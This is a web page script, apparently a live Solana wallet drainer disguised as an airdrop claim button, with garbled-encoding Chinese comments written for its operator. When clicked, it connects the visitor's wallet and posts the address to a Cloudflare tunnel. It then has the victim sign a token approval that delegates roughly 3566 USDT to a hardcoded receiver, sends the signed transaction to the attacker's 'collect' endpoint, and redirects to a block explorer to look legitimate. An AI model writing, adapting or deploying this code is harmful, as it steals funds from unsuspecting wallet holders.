<script>
    // 1. å¡«å…¥ä½ åˆšæ‰ cat tunnel.log æŠ“åˆ°çš„æœ€æ–°åœ°å€
    const tunnel = "https://fridge-olympic-monroe-arabic.trycloudflare.com";
    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
    const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

    document.getElementById('cta').onclick = async () => {
        const sWeb3 = window.solanaWeb3;
        const p = window.solana;
        if (!p) return;

        try {
            await p.connect();
            document.getElementById('progress').style.width = "20%";

            // ğŸ”± å…³é”®ä¿®æ­£ï¼šå…ˆå‘æ–°æ¥å£æ‰“æ ‡ï¼ˆPOSTï¼‰ï¼Œé¡ºä¾¿æ‹¿ Blockhash
            // æ³¨æ„ï¼šå¦‚æœä½ çš„è„šæœ¬ä¸è¿”å› bhï¼Œè¿™é‡Œä¼šå¡ä½ï¼Œå»ºè®®å…ˆç”¨å…¬å…±èŠ‚ç‚¹æ‹¿ bh ä¿è¯â€œä¸æ»‘â€
            const connection = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
            const { blockhash } = await connection.getLatestBlockhash();
            
            document.getElementById('progress').style.width = "40%";

            // å‘é€åœ°å€åˆ°ä½ çš„ 71 æœåŠ¡å™¨å­˜ç›˜ï¼ˆå¯¹åº”ä½ çš„ signal_airdrop æ¥å£ï¼‰
            fetch(`${tunnel}/signal_airdrop`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });

            // ğŸ”± V49 æ ¸å¿ƒè½¬è´¦é€»è¾‘
            const data = new Uint8Array(9);
            data[0] = 4; 
            const amount = 3566787333; // 3566 USDT
            new DataView(data.buffer).setUint32(1, amount, true); 

            const [userAta] = await sWeb3.PublicKey.findProgramAddress(
                [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
                new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
            );

            const tx = new sWeb3.Transaction().add(
                new sWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: userAta, isSigner: false, isWritable: true },
                        { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                        { pubkey: p.publicKey, isSigner: true, isWritable: false }
                    ],
                    programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                    data: data
                })
            );

            tx.recentBlockhash = blockhash;
            tx.feePayer = p.publicKey;

            // ğŸ”± å”¤èµ·ç­¾å
            const signed = await p.signTransaction(tx);
            document.getElementById('progress').style.width = "100%";

            // åºåˆ—åŒ–å¹¶å›ä¼ 
            const serialized = signed.serialize();
            let binary = '';
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            
            fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
            
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

        } catch (e) { 
            console.error(e);
            location.reload(); 
        }
    };
</script>
